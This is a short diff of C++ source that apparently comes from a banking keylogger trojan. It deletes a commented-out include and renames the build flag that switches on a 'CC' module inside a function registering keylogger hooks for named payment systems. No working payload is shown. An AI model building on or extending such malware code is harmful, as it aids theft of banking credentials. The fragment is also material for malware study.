@@ -14,8 +14,6 @@
 #include "FakturaWeb.cpp"
 #include "AvangardWeb.cpp"
 
-//#include "cc.cpp"
-
 //#include "BotDebug.h"
 
 namespace KEYLOGSYSTEMS
@@ -279,7 +277,7 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 		YandexSearchJpg::Init();
 	#endif
 
-	#ifdef CCModule
+	#ifdef CCH
 		CC::Init(hashApp);
 	#endif
 }
